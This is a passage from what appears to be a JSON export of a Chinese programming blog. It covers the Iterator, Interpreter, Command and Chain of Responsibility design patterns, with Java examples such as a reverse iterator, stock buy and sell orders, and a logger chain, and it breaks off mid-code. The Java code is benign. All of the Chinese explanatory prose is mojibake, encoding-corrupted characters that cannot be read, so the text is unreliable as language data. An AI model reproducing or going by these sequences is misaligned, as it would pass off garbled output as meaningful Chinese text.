è™½ç„¶æˆ‘ä»¬å¯¹å¦‚ä½•ä½¿ç”¨Iteratoræœ‰äº†ä¸€å®šäº†è§£ï¼Œä½†å¦‚ä½•å®ç°ä¸€ä¸ªIteratoræ¨¡å¼å‘¢ï¼Ÿæˆ‘ä»¬ä»¥ä¸€ä¸ªè‡ªå®šä¹‰çš„é›†åˆä¸ºä¾‹ï¼Œé€šè¿‡Iteratoræ¨¡å¼å®ç°å€’åºéå†ï¼š public class ReverseArrayCollection&lt;T&gt; implements Iterable&lt;T&gt; { // ä»¥æ•°ç»„å½¢å¼æŒæœ‰é›†åˆ: private T[] array; public ReverseArrayCollection(T... objs) { this.array = Arrays.copyOfRange(objs, 0, objs.length); } public Iterator&lt;T&gt; iterator() { return ???; } } å®ç°Iteratoræ¨¡å¼çš„å…³é”®æ˜¯è¿”å›ä¸€ä¸ªIteratorå¯¹è±¡ï¼Œè¯¥å¯¹è±¡çŸ¥é“é›†åˆçš„å†…éƒ¨ç»“æ„ï¼Œå› ä¸ºå®ƒå¯ä»¥å®ç°å€’åºéå†ã€‚æˆ‘ä»¬ä½¿ç”¨Javaçš„å†…éƒ¨ç±»å®ç°è¿™ä¸ªIteratorï¼š public class ReverseArrayCollection&lt;T&gt; implements Iterable&lt;T&gt; { private T[] array; public ReverseArrayCollection(T... objs) { this.array = Arrays.copyOfRange(objs, 0, objs.length); } public Iterator&lt;T&gt; iterator() { return new ReverseIterator(); } class ReverseIterator implements Iterator&lt;T&gt; { // ç´¢å¼•ä½ç½®: int index; public ReverseIterator() { // åˆ›å»ºIteratoræ—¶,ç´¢å¼•åœ¨æ•°ç»„æœ«å°¾: this.index = ReverseArrayCollection.this.array.length; } public boolean hasNext() { // å¦‚æœç´¢å¼•å¤§äº0,é‚£ä¹ˆå¯ä»¥ç§»åŠ¨åˆ°ä¸‹ä¸€ä¸ªå…ƒç´ (å€’åºå¾€å‰ç§»åŠ¨): return index &gt; 0; } public T next() { // å°†ç´¢å¼•ç§»åŠ¨åˆ°ä¸‹ä¸€ä¸ªå…ƒç´ å¹¶è¿”å›(å€’åºå¾€å‰ç§»åŠ¨): index--; return array[index]; } } } ä½¿ç”¨å†…éƒ¨ç±»çš„å¥½å¤„æ˜¯å†…éƒ¨ç±»éšå«åœ°æŒæœ‰ä¸€ä¸ªå®ƒæ‰€åœ¨å¯¹è±¡çš„thiså¼•ç”¨ï¼Œå¯ä»¥é€šè¿‡ReverseArrayCollection.thiså¼•ç”¨åˆ°å®ƒæ‰€åœ¨çš„é›†åˆã€‚ä¸Šè¿°ä»£ç å®ç°çš„é€»è¾‘éå¸¸ç®€å•ï¼Œä½†æ˜¯å®é™…åº”ç”¨æ—¶ï¼Œå¦‚æœè€ƒè™‘åˆ°å¤šçº¿ç¨‹è®¿é—®ï¼Œå½“ä¸€ä¸ªçº¿ç¨‹æ­£åœ¨è¿­ä»£æŸä¸ªé›†åˆï¼Œè€Œå¦ä¸€ä¸ªçº¿ç¨‹ä¿®æ”¹äº†é›†åˆçš„å†…å®¹æ—¶ï¼Œæ˜¯å¦èƒ½ç»§ç»­å®‰å…¨åœ°è¿­ä»£ï¼Œè¿˜æ˜¯æŠ›å‡ºConcurrentModificationExceptionï¼Œå°±éœ€è¦æ›´ä»”ç»†åœ°è®¾è®¡ã€‚","categories":[],"tags":[{"name":"DesignPatterns","slug":"DesignPatterns","permalink":"https://blog.kayleh.top/tags/DesignPatterns/"}]},{"title":"è§£é‡Šå™¨æ¨¡å¼","slug":"è§£é‡Šå™¨æ¨¡å¼","date":"2020-06-12T05:31:18.000Z","updated":"2021-04-11T17:11:29.018Z","comments":true,"path":"è§£é‡Šå™¨æ¨¡å¼/","link":"","permalink":"https://blog.kayleh.top/%E8%A7%A3%E9%87%8A%E5%99%A8%E6%A8%A1%E5%BC%8F/","excerpt":"è§£é‡Šå™¨æ¨¡å¼ è§£é‡Šå™¨æ¨¡å¼ï¼ˆInterpreter Patternï¼‰æä¾›äº†è¯„ä¼°è¯­è¨€çš„è¯­æ³•æˆ–è¡¨è¾¾å¼çš„æ–¹å¼ï¼Œå®ƒå±äºè¡Œä¸ºå‹æ¨¡å¼ã€‚è¿™ç§æ¨¡å¼å®ç°äº†ä¸€ä¸ªè¡¨è¾¾å¼æ¥å£ï¼Œè¯¥æ¥å£è§£é‡Šä¸€ä¸ªç‰¹å®šçš„ä¸Šä¸‹æ–‡ã€‚è¿™ç§æ¨¡å¼è¢«ç”¨åœ¨ SQL è§£æã€ç¬¦å·å¤„ç†å¼•æ“ç­‰ã€‚","text":"è§£é‡Šå™¨æ¨¡å¼ è§£é‡Šå™¨æ¨¡å¼ï¼ˆInterpreter Patternï¼‰æä¾›äº†è¯„ä¼°è¯­è¨€çš„è¯­æ³•æˆ–è¡¨è¾¾å¼çš„æ–¹å¼ï¼Œå®ƒå±äºè¡Œä¸ºå‹æ¨¡å¼ã€‚è¿™ç§æ¨¡å¼å®ç°äº†ä¸€ä¸ªè¡¨è¾¾å¼æ¥å£ï¼Œè¯¥æ¥å£è§£é‡Šä¸€ä¸ªç‰¹å®šçš„ä¸Šä¸‹æ–‡ã€‚è¿™ç§æ¨¡å¼è¢«ç”¨åœ¨ SQL è§£æã€ç¬¦å·å¤„ç†å¼•æ“ç­‰ã€‚ ä»‹ç»æ„å›¾ï¼šç»™å®šä¸€ä¸ªè¯­è¨€ï¼Œå®šä¹‰å®ƒçš„æ–‡æ³•è¡¨ç¤ºï¼Œå¹¶å®šä¹‰ä¸€ä¸ªè§£é‡Šå™¨ï¼Œè¿™ä¸ªè§£é‡Šå™¨ä½¿ç”¨è¯¥æ ‡è¯†æ¥è§£é‡Šè¯­è¨€ä¸­çš„å¥å­ã€‚ ä¸»è¦è§£å†³ï¼šå¯¹äºä¸€äº›å›ºå®šæ–‡æ³•æ„å»ºä¸€ä¸ªè§£é‡Šå¥å­çš„è§£é‡Šå™¨ã€‚ ä½•æ—¶ä½¿ç”¨ï¼šå¦‚æœä¸€ç§ç‰¹å®šç±»å‹çš„é—®é¢˜å‘ç”Ÿçš„é¢‘ç‡è¶³å¤Ÿé«˜ï¼Œé‚£ä¹ˆå¯èƒ½å°±å€¼å¾—å°†è¯¥é—®é¢˜çš„å„ä¸ªå®ä¾‹è¡¨è¿°ä¸ºä¸€ä¸ªç®€å•è¯­è¨€ä¸­çš„å¥å­ã€‚è¿™æ ·å°±å¯ä»¥æ„å»ºä¸€ä¸ªè§£é‡Šå™¨ï¼Œè¯¥è§£é‡Šå™¨é€šè¿‡è§£é‡Šè¿™äº›å¥å­æ¥è§£å†³è¯¥é—®é¢˜ã€‚ å¦‚ä½•è§£å†³ï¼šæ„å»ºè¯­æ³•æ ‘ï¼Œå®šä¹‰ç»ˆç»“ç¬¦ä¸éç»ˆç»“ç¬¦ã€‚ å…³é”®ä»£ç ï¼šæ„å»ºç¯å¢ƒç±»ï¼ŒåŒ…å«è§£é‡Šå™¨ä¹‹å¤–çš„ä¸€äº›å…¨å±€ä¿¡æ¯ï¼Œä¸€èˆ¬æ˜¯ HashMapã€‚ åº”ç”¨å®ä¾‹ï¼šç¼–è¯‘å™¨ã€è¿ç®—è¡¨è¾¾å¼è®¡ç®—ã€‚ ä¼˜ç‚¹ï¼š 1ã€å¯æ‰©å±•æ€§æ¯”è¾ƒå¥½ï¼Œçµæ´»ã€‚ 2ã€å¢åŠ äº†æ–°çš„è§£é‡Šè¡¨è¾¾å¼çš„æ–¹å¼ã€‚ 3ã€æ˜“äºå®ç°ç®€å•æ–‡æ³•ã€‚ ç¼ºç‚¹ï¼š 1ã€å¯åˆ©ç”¨åœºæ™¯æ¯”è¾ƒå°‘ã€‚ 2ã€å¯¹äºå¤æ‚çš„æ–‡æ³•æ¯”è¾ƒéš¾ç»´æŠ¤ã€‚ 3ã€è§£é‡Šå™¨æ¨¡å¼ä¼šå¼•èµ·ç±»è†¨èƒ€ã€‚ 4ã€è§£é‡Šå™¨æ¨¡å¼é‡‡ç”¨é€’å½’è°ƒç”¨æ–¹æ³•ã€‚ ä½¿ç”¨åœºæ™¯ï¼š 1ã€å¯ä»¥å°†ä¸€ä¸ªéœ€è¦è§£é‡Šæ‰§è¡Œçš„è¯­è¨€ä¸­çš„å¥å­è¡¨ç¤ºä¸ºä¸€ä¸ªæŠ½è±¡è¯­æ³•æ ‘ã€‚ 2ã€ä¸€äº›é‡å¤å‡ºç°çš„é—®é¢˜å¯ä»¥ç”¨ä¸€ç§ç®€å•çš„è¯­è¨€æ¥è¿›è¡Œè¡¨è¾¾ã€‚ 3ã€ä¸€ä¸ªç®€å•è¯­æ³•éœ€è¦è§£é‡Šçš„åœºæ™¯ã€‚ æ³¨æ„äº‹é¡¹ï¼šå¯åˆ©ç”¨åœºæ™¯æ¯”è¾ƒå°‘ï¼ŒJAVA ä¸­å¦‚æœç¢°åˆ°å¯ä»¥ç”¨ expression4J ä»£æ›¿ã€‚ å®ç°æˆ‘ä»¬å°†åˆ›å»ºä¸€ä¸ªæ¥å£ Expression å’Œå®ç°äº† Expression æ¥å£çš„å®ä½“ç±»ã€‚å®šä¹‰ä½œä¸ºä¸Šä¸‹æ–‡ä¸­ä¸»è¦è§£é‡Šå™¨çš„ TerminalExpression ç±»ã€‚å…¶ä»–çš„ç±» OrExpressionã€AndExpression ç”¨äºåˆ›å»ºç»„åˆå¼è¡¨è¾¾å¼ã€‚ InterpreterPatternDemoï¼Œæˆ‘ä»¬çš„æ¼”ç¤ºç±»ä½¿ç”¨ Expression ç±»åˆ›å»ºè§„åˆ™å’Œæ¼”ç¤ºè¡¨è¾¾å¼çš„è§£æã€‚ è§£é‡Šå™¨æ¨¡å¼çš„ UML å›¾ æ­¥éª¤ 1åˆ›å»ºä¸€ä¸ªè¡¨è¾¾å¼æ¥å£ã€‚ img æ­¥éª¤ 2åˆ›å»ºå®ç°äº†ä¸Šè¿°æ¥å£çš„å®ä½“ç±»ã€‚ img img img æ­¥éª¤ 3InterpreterPatternDemo ä½¿ç”¨ Expression ç±»æ¥åˆ›å»ºè§„åˆ™ï¼Œå¹¶è§£æå®ƒä»¬ã€‚ img æ­¥éª¤ 4æ‰§è¡Œç¨‹åºï¼Œè¾“å‡ºç»“æœï¼š John is male? true Julie is a married women? true","categories":[],"tags":[{"name":"DesignPatterns","slug":"DesignPatterns","permalink":"https://blog.kayleh.top/tags/DesignPatterns/"}]},{"title":"å‘½ä»¤æ¨¡å¼","slug":"å‘½ä»¤æ¨¡å¼","date":"2020-06-12T02:12:06.000Z","updated":"2021-04-11T17:11:28.799Z","comments":true,"path":"å‘½ä»¤æ¨¡å¼/","link":"","permalink":"https://blog.kayleh.top/%E5%91%BD%E4%BB%A4%E6%A8%A1%E5%BC%8F/","excerpt":"å‘½ä»¤æ¨¡å¼ å‘½ä»¤æ¨¡å¼ï¼ˆCommand Patternï¼‰æ˜¯ä¸€ç§æ•°æ®é©±åŠ¨çš„è®¾è®¡æ¨¡å¼ï¼Œå®ƒå±äºè¡Œä¸ºå‹æ¨¡å¼ã€‚è¯·æ±‚ä»¥å‘½ä»¤çš„å½¢å¼åŒ…è£¹åœ¨å¯¹è±¡ä¸­ï¼Œå¹¶ä¼ ç»™è°ƒç”¨å¯¹è±¡ã€‚è°ƒç”¨å¯¹è±¡å¯»æ‰¾å¯ä»¥å¤„ç†è¯¥å‘½ä»¤çš„åˆé€‚çš„å¯¹è±¡ï¼Œå¹¶æŠŠè¯¥å‘½ä»¤ä¼ ç»™ç›¸åº”çš„å¯¹è±¡ï¼Œè¯¥å¯¹è±¡æ‰§è¡Œå‘½ä»¤ã€‚","text":"å‘½ä»¤æ¨¡å¼ å‘½ä»¤æ¨¡å¼ï¼ˆCommand Patternï¼‰æ˜¯ä¸€ç§æ•°æ®é©±åŠ¨çš„è®¾è®¡æ¨¡å¼ï¼Œå®ƒå±äºè¡Œä¸ºå‹æ¨¡å¼ã€‚è¯·æ±‚ä»¥å‘½ä»¤çš„å½¢å¼åŒ…è£¹åœ¨å¯¹è±¡ä¸­ï¼Œå¹¶ä¼ ç»™è°ƒç”¨å¯¹è±¡ã€‚è°ƒç”¨å¯¹è±¡å¯»æ‰¾å¯ä»¥å¤„ç†è¯¥å‘½ä»¤çš„åˆé€‚çš„å¯¹è±¡ï¼Œå¹¶æŠŠè¯¥å‘½ä»¤ä¼ ç»™ç›¸åº”çš„å¯¹è±¡ï¼Œè¯¥å¯¹è±¡æ‰§è¡Œå‘½ä»¤ã€‚ ä»‹ç»æ„å›¾ï¼šå°†ä¸€ä¸ªè¯·æ±‚å°è£…æˆä¸€ä¸ªå¯¹è±¡ï¼Œä»è€Œä½¿æ‚¨å¯ä»¥ç”¨ä¸åŒçš„è¯·æ±‚å¯¹å®¢æˆ·è¿›è¡Œå‚æ•°åŒ–ã€‚ ä¸»è¦è§£å†³ï¼šåœ¨è½¯ä»¶ç³»ç»Ÿä¸­ï¼Œè¡Œä¸ºè¯·æ±‚è€…ä¸è¡Œä¸ºå®ç°è€…é€šå¸¸æ˜¯ä¸€ç§ç´§è€¦åˆçš„å…³ç³»ï¼Œä½†æŸäº›åœºåˆï¼Œæ¯”å¦‚éœ€è¦å¯¹è¡Œä¸ºè¿›è¡Œè®°å½•ã€æ’¤é”€æˆ–é‡åšã€äº‹åŠ¡ç­‰å¤„ç†æ—¶ï¼Œè¿™ç§æ— æ³•æŠµå¾¡å˜åŒ–çš„ç´§è€¦åˆçš„è®¾è®¡å°±ä¸å¤ªåˆé€‚ã€‚ ä½•æ—¶ä½¿ç”¨ï¼šåœ¨æŸäº›åœºåˆï¼Œæ¯”å¦‚è¦å¯¹è¡Œä¸ºè¿›è¡Œâ€è®°å½•ã€æ’¤é”€/é‡åšã€äº‹åŠ¡â€ç­‰å¤„ç†ï¼Œè¿™ç§æ— æ³•æŠµå¾¡å˜åŒ–çš„ç´§è€¦åˆæ˜¯ä¸åˆé€‚çš„ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¦‚ä½•å°†â€è¡Œä¸ºè¯·æ±‚è€…â€ä¸â€è¡Œä¸ºå®ç°è€…â€è§£è€¦ï¼Ÿå°†ä¸€ç»„è¡Œä¸ºæŠ½è±¡ä¸ºå¯¹è±¡ï¼Œå¯ä»¥å®ç°äºŒè€…ä¹‹é—´çš„æ¾è€¦åˆã€‚ å¦‚ä½•è§£å†³ï¼šé€šè¿‡è°ƒç”¨è€…è°ƒç”¨æ¥å—è€…æ‰§è¡Œå‘½ä»¤ï¼Œé¡ºåºï¼šè°ƒç”¨è€…â†’æ¥å—è€…â†’å‘½ä»¤ã€‚ å…³é”®ä»£ç ï¼šå®šä¹‰ä¸‰ä¸ªè§’è‰²ï¼š1ã€received çœŸæ­£çš„å‘½ä»¤æ‰§è¡Œå¯¹è±¡ 2ã€Command 3ã€invoker ä½¿ç”¨å‘½ä»¤å¯¹è±¡çš„å…¥å£ åº”ç”¨å®ä¾‹ï¼šstruts 1 ä¸­çš„ action æ ¸å¿ƒæ§åˆ¶å™¨ ActionServlet åªæœ‰ä¸€ä¸ªï¼Œç›¸å½“äº Invokerï¼Œè€Œæ¨¡å‹å±‚çš„ç±»ä¼šéšç€ä¸åŒçš„åº”ç”¨æœ‰ä¸åŒçš„æ¨¡å‹ç±»ï¼Œç›¸å½“äºå…·ä½“çš„ Commandã€‚ ä¼˜ç‚¹ï¼š 1ã€é™ä½äº†ç³»ç»Ÿè€¦åˆåº¦ã€‚ â€‹ 2ã€æ–°çš„å‘½ä»¤å¯ä»¥å¾ˆå®¹æ˜“æ·»åŠ åˆ°ç³»ç»Ÿä¸­å»ã€‚ ç¼ºç‚¹ï¼š ä½¿ç”¨å‘½ä»¤æ¨¡å¼å¯èƒ½ä¼šå¯¼è‡´æŸäº›ç³»ç»Ÿæœ‰è¿‡å¤šçš„å…·ä½“å‘½ä»¤ç±»ã€‚ ä½¿ç”¨åœºæ™¯ï¼šè®¤ä¸ºæ˜¯å‘½ä»¤çš„åœ°æ–¹éƒ½å¯ä»¥ä½¿ç”¨å‘½ä»¤æ¨¡å¼ï¼Œ æ¯”å¦‚ï¼š â€‹ 1ã€GUI ä¸­æ¯ä¸€ä¸ªæŒ‰é’®éƒ½æ˜¯ä¸€æ¡å‘½ä»¤ã€‚ â€‹ 2ã€æ¨¡æ‹Ÿ CMDã€‚ æ³¨æ„äº‹é¡¹ï¼šç³»ç»Ÿéœ€è¦æ”¯æŒå‘½ä»¤çš„æ’¤é”€(Undo)æ“ä½œå’Œæ¢å¤(Redo)æ“ä½œï¼Œä¹Ÿå¯ä»¥è€ƒè™‘ä½¿ç”¨å‘½ä»¤æ¨¡å¼ï¼Œè§å‘½ä»¤æ¨¡å¼çš„æ‰©å±•ã€‚ å®ç°æˆ‘ä»¬é¦–å…ˆåˆ›å»ºä½œä¸ºå‘½ä»¤çš„æ¥å£ Orderï¼Œç„¶ååˆ›å»ºä½œä¸ºè¯·æ±‚çš„ Stock ç±»ã€‚å®ä½“å‘½ä»¤ç±» BuyStock å’Œ SellStockï¼Œå®ç°äº† Order æ¥å£ï¼Œå°†æ‰§è¡Œå®é™…çš„å‘½ä»¤å¤„ç†ã€‚åˆ›å»ºä½œä¸ºè°ƒç”¨å¯¹è±¡çš„ç±» Brokerï¼Œå®ƒæ¥å—è®¢å•å¹¶èƒ½ä¸‹è®¢å•ã€‚ Broker å¯¹è±¡ä½¿ç”¨å‘½ä»¤æ¨¡å¼ï¼ŒåŸºäºå‘½ä»¤çš„ç±»å‹ç¡®å®šå“ªä¸ªå¯¹è±¡æ‰§è¡Œå“ªä¸ªå‘½ä»¤ã€‚CommandPatternDemoï¼Œæˆ‘ä»¬çš„æ¼”ç¤ºç±»ä½¿ç”¨ Broker ç±»æ¥æ¼”ç¤ºå‘½ä»¤æ¨¡å¼ã€‚ å‘½ä»¤æ¨¡å¼çš„ UML å›¾ æ­¥éª¤1åˆ›å»ºä¸€ä¸ªå‘½ä»¤æ¥å£ã€‚ Order.javapublic interface Order { void execute(); } æ­¥éª¤ 2åˆ›å»ºä¸€ä¸ªè¯·æ±‚ç±»ã€‚ Stock.javapublic class Stock { private String name = &quot;ABC&quot;; private int quantity = 10; public void buy(){ System.out.println(&quot;Stock [ Name: &quot;+name+&quot;, Quantity: &quot; + quantity +&quot; ] bought&quot;); } public void sell(){ System.out.println(&quot;Stock [ Name: &quot;+name+&quot;, Quantity: &quot; + quantity +&quot; ] sold&quot;); } } æ­¥éª¤ 3åˆ›å»ºå®ç°äº† Order æ¥å£çš„å®ä½“ç±»ã€‚ BuyStock.javapublic class BuyStock implements Order { private Stock abcStock; public BuyStock(Stock abcStock){ this.abcStock = abcStock; } public void execute() { abcStock.buy(); } } SellStock.javapublic class SellStock implements Order { private Stock abcStock; public SellStock(Stock abcStock){ this.abcStock = abcStock; } public void execute() { abcStock.sell(); } } æ­¥éª¤ 4åˆ›å»ºå‘½ä»¤è°ƒç”¨ç±»ã€‚ Broker.javaimport java.util.ArrayList; import java.util.List; public class Broker { private List&lt;Order&gt; orderList = new ArrayList&lt;Order&gt;(); public void takeOrder(Order order){ orderList.add(order); } public void placeOrders(){ for (Order order : orderList) { order.execute(); } orderList.clear(); } } ä½¿ç”¨ Broker ç±»æ¥æ¥å—å¹¶æ‰§è¡Œå‘½ä»¤ã€‚ CommandPatternDemo.javapublic class CommandPatternDemo { public static void main(String[] args) { Stock abcStock = new Stock(); BuyStock buyStockOrder = new BuyStock(abcStock); SellStock sellStockOrder = new SellStock(abcStock); Broker broker = new Broker(); broker.takeOrder(buyStockOrder); broker.takeOrder(sellStockOrder); broker.placeOrders(); } } æ­¥éª¤ 6æ‰§è¡Œç¨‹åºï¼Œè¾“å‡ºç»“æœï¼š Stock [ Name: ABC, Quantity: 10 ] bought Stock [ Name: ABC, Quantity: 10 ] sold","categories":[{"name":"è®¾è®¡æ¨¡å¼","slug":"è®¾è®¡æ¨¡å¼","permalink":"https://blog.kayleh.top/categories/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"}],"tags":[{"name":"DesignPatterns","slug":"DesignPatterns","permalink":"https://blog.kayleh.top/tags/DesignPatterns/"}]},{"title":"è´£ä»»é“¾æ¨¡å¼","slug":"è´£ä»»é“¾æ¨¡å¼","date":"2020-06-11T03:48:35.000Z","updated":"2021-04-11T17:11:29.048Z","comments":true,"path":"è´£ä»»é“¾æ¨¡å¼/","link":"","permalink":"https://blog.kayleh.top/%E8%B4%A3%E4%BB%BB%E9%93%BE%E6%A8%A1%E5%BC%8F/","excerpt":"è´£ä»»é“¾æ¨¡å¼ è´£ä»»é“¾æ¨¡å¼ï¼ˆChain of Responsibility Patternï¼‰ä¸ºè¯·æ±‚åˆ›å»ºäº†ä¸€ä¸ªæ¥æ”¶è€…å¯¹è±¡çš„é“¾ã€‚è¿™ç§æ¨¡å¼ç»™äºˆè¯·æ±‚çš„ç±»å‹ï¼Œå¯¹è¯·æ±‚çš„å‘é€è€…å’Œæ¥æ”¶è€…è¿›è¡Œè§£è€¦ã€‚è¿™ç§ç±»å‹çš„è®¾è®¡æ¨¡å¼å±äºè¡Œä¸ºå‹æ¨¡å¼ã€‚","text":"è´£ä»»é“¾æ¨¡å¼ è´£ä»»é“¾æ¨¡å¼ï¼ˆChain of Responsibility Patternï¼‰ä¸ºè¯·æ±‚åˆ›å»ºäº†ä¸€ä¸ªæ¥æ”¶è€…å¯¹è±¡çš„é“¾ã€‚è¿™ç§æ¨¡å¼ç»™äºˆè¯·æ±‚çš„ç±»å‹ï¼Œå¯¹è¯·æ±‚çš„å‘é€è€…å’Œæ¥æ”¶è€…è¿›è¡Œè§£è€¦ã€‚è¿™ç§ç±»å‹çš„è®¾è®¡æ¨¡å¼å±äºè¡Œä¸ºå‹æ¨¡å¼ã€‚ ä»‹ç»æ„å›¾ï¼šé¿å…è¯·æ±‚å‘é€è€…ä¸æ¥æ”¶è€…è€¦åˆåœ¨ä¸€èµ·ï¼Œè®©å¤šä¸ªå¯¹è±¡éƒ½æœ‰å¯èƒ½æ¥æ”¶è¯·æ±‚ï¼Œå°†è¿™äº›å¯¹è±¡è¿æ¥æˆä¸€æ¡é“¾ï¼Œå¹¶ä¸”æ²¿ç€è¿™æ¡é“¾ä¼ é€’è¯·æ±‚ï¼Œç›´åˆ°æœ‰å¯¹è±¡å¤„ç†å®ƒä¸ºæ­¢ã€‚ ä¸»è¦è§£å†³ï¼šèŒè´£é“¾ä¸Šçš„å¤„ç†è€…è´Ÿè´£å¤„ç†è¯·æ±‚ï¼Œå®¢æˆ·åªéœ€è¦å°†è¯·æ±‚å‘é€åˆ°èŒè´£é“¾ä¸Šå³å¯ï¼Œæ— é¡»å…³å¿ƒè¯·æ±‚çš„å¤„ç†ç»†èŠ‚å’Œè¯·æ±‚çš„ä¼ é€’ï¼Œæ‰€ä»¥èŒè´£é“¾å°†è¯·æ±‚çš„å‘é€è€…å’Œè¯·æ±‚çš„å¤„ç†è€…è§£è€¦äº†ã€‚ ä½•æ—¶ä½¿ç”¨ï¼šåœ¨å¤„ç†æ¶ˆæ¯çš„æ—¶å€™ä»¥è¿‡æ»¤å¾ˆå¤šé“ã€‚ å¦‚ä½•è§£å†³ï¼šæ‹¦æˆªçš„ç±»éƒ½å®ç°ç»Ÿä¸€æ¥å£ã€‚ å…³é”®ä»£ç ï¼šHandler é‡Œé¢èšåˆå®ƒè‡ªå·±ï¼Œåœ¨ HandlerRequest é‡Œåˆ¤æ–­æ˜¯å¦åˆé€‚ï¼Œå¦‚æœæ²¡è¾¾åˆ°æ¡ä»¶åˆ™å‘ä¸‹ä¼ é€’ï¼Œå‘è°ä¼ é€’ä¹‹å‰ set è¿›å»ã€‚ åº”ç”¨å®ä¾‹ï¼š 1ã€çº¢æ¥¼æ¢¦ä¸­çš„â€å‡»é¼“ä¼ èŠ±â€ã€‚ 2ã€JS ä¸­çš„äº‹ä»¶å†’æ³¡ã€‚ 3ã€JAVA WEB ä¸­ Apache Tomcat å¯¹ Encoding çš„å¤„ç†ï¼ŒStruts2 çš„æ‹¦æˆªå™¨ï¼Œjsp servlet çš„ Filterã€‚ ä¼˜ç‚¹ï¼š 1ã€é™ä½è€¦åˆåº¦ã€‚å®ƒå°†è¯·æ±‚çš„å‘é€è€…å’Œæ¥æ”¶è€…è§£è€¦ã€‚ 2ã€ç®€åŒ–äº†å¯¹è±¡ã€‚ä½¿å¾—å¯¹è±¡ä¸éœ€è¦çŸ¥é“é“¾çš„ç»“æ„ã€‚ 3ã€å¢å¼ºç»™å¯¹è±¡æŒ‡æ´¾èŒè´£çš„çµæ´»æ€§ã€‚é€šè¿‡æ”¹å˜é“¾å†…çš„æˆå‘˜æˆ–è€…è°ƒåŠ¨å®ƒä»¬çš„æ¬¡åºï¼Œå…è®¸åŠ¨æ€åœ°æ–°å¢æˆ–è€…åˆ é™¤è´£ä»»ã€‚ 4ã€å¢åŠ æ–°çš„è¯·æ±‚å¤„ç†ç±»å¾ˆæ–¹ä¾¿ã€‚ ç¼ºç‚¹ï¼š 1ã€ä¸èƒ½ä¿è¯è¯·æ±‚ä¸€å®šè¢«æ¥æ”¶ã€‚ 2ã€ç³»ç»Ÿæ€§èƒ½å°†å—åˆ°ä¸€å®šå½±å“ï¼Œè€Œä¸”åœ¨è¿›è¡Œä»£ç è°ƒè¯•æ—¶ä¸å¤ªæ–¹ä¾¿ï¼Œå¯èƒ½ä¼šé€ æˆå¾ªç¯è°ƒç”¨ã€‚ 3ã€å¯èƒ½ä¸å®¹æ˜“è§‚å¯Ÿè¿è¡Œæ—¶çš„ç‰¹å¾ï¼Œæœ‰ç¢äºé™¤é”™ã€‚ ä½¿ç”¨åœºæ™¯ï¼š 1ã€æœ‰å¤šä¸ªå¯¹è±¡å¯ä»¥å¤„ç†åŒä¸€ä¸ªè¯·æ±‚ï¼Œå…·ä½“å“ªä¸ªå¯¹è±¡å¤„ç†è¯¥è¯·æ±‚ç”±è¿è¡Œæ—¶åˆ»è‡ªåŠ¨ç¡®å®šã€‚ 2ã€åœ¨ä¸æ˜ç¡®æŒ‡å®šæ¥æ”¶è€…çš„æƒ…å†µä¸‹ï¼Œå‘å¤šä¸ªå¯¹è±¡ä¸­çš„ä¸€ä¸ªæäº¤ä¸€ä¸ªè¯·æ±‚ã€‚ 3ã€å¯åŠ¨æ€æŒ‡å®šä¸€ç»„å¯¹è±¡å¤„ç†è¯·æ±‚ã€‚ æ³¨æ„äº‹é¡¹ï¼šåœ¨ JAVA WEB ä¸­é‡åˆ°å¾ˆå¤šåº”ç”¨ã€‚ å®ç°æˆ‘ä»¬åˆ›å»ºæŠ½è±¡ç±» AbstractLoggerï¼Œå¸¦æœ‰è¯¦ç»†çš„æ—¥å¿—è®°å½•çº§åˆ«ã€‚ç„¶åæˆ‘ä»¬åˆ›å»ºä¸‰ç§ç±»å‹çš„è®°å½•å™¨ï¼Œéƒ½æ‰©å±•äº† AbstractLoggerã€‚æ¯ä¸ªè®°å½•å™¨æ¶ˆæ¯çš„çº§åˆ«æ˜¯å¦å±äºè‡ªå·±çš„çº§åˆ«ï¼Œå¦‚æœæ˜¯åˆ™ç›¸åº”åœ°æ‰“å°å‡ºæ¥ï¼Œå¦åˆ™å°†ä¸æ‰“å°å¹¶æŠŠæ¶ˆæ¯ä¼ ç»™ä¸‹ä¸€ä¸ªè®°å½•å™¨ã€‚ è´£ä»»é“¾æ¨¡å¼çš„ UML å›¾ æ­¥éª¤1åˆ›å»ºæŠ½è±¡çš„è®°å½•å™¨ç±»ã€‚ AbstractLogger.javapublic abstract class AbstractLogger { public static int INFO = 1; public static int DEBUG = 2; public static int ERROR = 3; protected int level; //è´£ä»»é“¾ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´  protected AbstractLogger nextLogger; public void setNextLogger(AbstractLogger nextLogger){ this.nextLogger = nextLogger; } public void logMessage(int level, String message){ if(this.level &lt;= level){ write(message); } if(nextLogger !=null){ nextLogger.logMessage(level, message); } } abstract protected void write(String message); } æ­¥éª¤ 2åˆ›å»ºæ‰©å±•äº†è¯¥è®°å½•å™¨ç±»çš„å®ä½“ç±»ã€‚ ConsoleLogger.javapublic class ConsoleLogger extends AbstractLogger { public ConsoleLogger(int level){ this.level = level; } @Override protected void write(String message) { System.out.println(&quot;Standard Console::Logger: &quot; + message); } } ErrorLogger.javapublic class ErrorLogger extends AbstractLogger { public ErrorLogger(int level){ this.level = level; } @Override protected void write(String message) { System.out.println(&quot;Error Console::Logger: &quot; + message); } } FileLogger.javapublic class FileLogger extends AbstractLogger { public FileLogger(int level){ this.level = level; } @Override protected void write(String message) { System.out.println(&quot;File::Logger: &quot; + message); } } æ­¥éª¤ 3åˆ›å»ºä¸åŒç±»å‹çš„è®°å½•å™¨ã€‚èµ‹äºˆå®ƒä»¬ä¸åŒçš„é”™è¯¯çº§åˆ«ï¼Œå¹¶åœ¨æ¯ä¸ªè®°å½•å™¨ä¸­è®¾ç½®ä¸‹ä¸€ä¸ªè®°å½•å™¨ã€‚æ¯ä¸ªè®°å½•å™¨ä¸­çš„ä¸‹ä¸€ä¸ªè®°å½•å™¨ä»£è¡¨çš„æ˜¯é“¾çš„ä¸€éƒ¨åˆ†ã€‚ ChainPatternDemo.javapublic class ChainPatternDemo { private static AbstractLogger getChainOfLoggers(){ AbstractLogger errorLogger = new ErrorLogger(AbstractLogger.ERROR); AbstractLogger fileLogger = new FileLogger(AbstractLogger.DEBUG); AbstractLogger consoleLogger = new ConsoleLogger(AbstractLogger.INFO); errorLogger.setNextLogger(fileLogger); fileLogger.setNextLogger(consoleLogger); return errorLogger; } public static void main(String[] args) { AbstractLogger loggerChain = getChainOfLoggers(); loggerChain.logMessage(AbstractLogger.INFO, &quot;This is an information.&quot;); 